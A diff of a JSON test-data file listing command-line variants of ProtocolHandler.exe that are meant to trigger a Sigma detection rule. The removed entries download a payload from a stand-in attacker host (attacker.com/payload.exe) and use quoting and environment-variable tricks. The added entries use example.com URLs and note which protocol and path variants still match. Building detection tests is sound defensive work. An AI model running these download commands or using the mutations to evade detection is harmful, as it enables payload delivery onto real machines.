@@ -1,14 +1,22 @@
 [
   {
-    "output": "ProtocolHandler.exe http://attacker.com/payload.exe",
-    "explanation": "Removes quotes around the URL, which are not strictly necessary for the command to function."
+    "output": "C:\\Windows\\System32\\ProtocolHandler.exe http://example.com/file.txt",
+    "explanation": "This command triggers the Sigma rule by invoking ProtocolHandler.exe with an HTTP URL, which matches the detection criteria."
   },
   {
-    "output": "ProtocolHandler.exe \"http://attacker.com\\payload.exe\"",
-    "explanation": "Inserts escape characters and uses double quotes to test parsing behavior while maintaining the same functionality."
+    "output": "C:\\\\Windows\\\\System32\\\\ProtocolHandler.exe http://example.com/file.txt",
+    "explanation": "Double backslashes are used as an insertion technique, but Windows still parses the path correctly. The HTTP URL ensures detection."
   },
   {
-    "output": "set URL=http://attacker.com/payload.exe && ProtocolHandler.exe %URL%",
-    "explanation": "Uses an environment variable to recode the URL, which is a safe mutation technique for testing."
+    "output": "\"C:\\Windows\\System32\\ProtocolHandler.exe\" http://example.com/file.txt",
+    "explanation": "Quotes are inserted around the executable path for safe parsing, but the command still matches the Sigma rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\ProtocolHandler.exe ftp://example.com/file.txt",
+    "explanation": "The protocol is changed from HTTP to FTP, which is still detected by the Sigma rule due to the 'ftp://' substring match."
+  },
+  {
+    "output": "C:\\Windows\\System32\\ProtocolHandler.exe https://example.com/file.txt",
+    "explanation": "The protocol is changed to HTTPS, which is still detected by the Sigma rule due to the 'https://' substring match."
   }
 ]
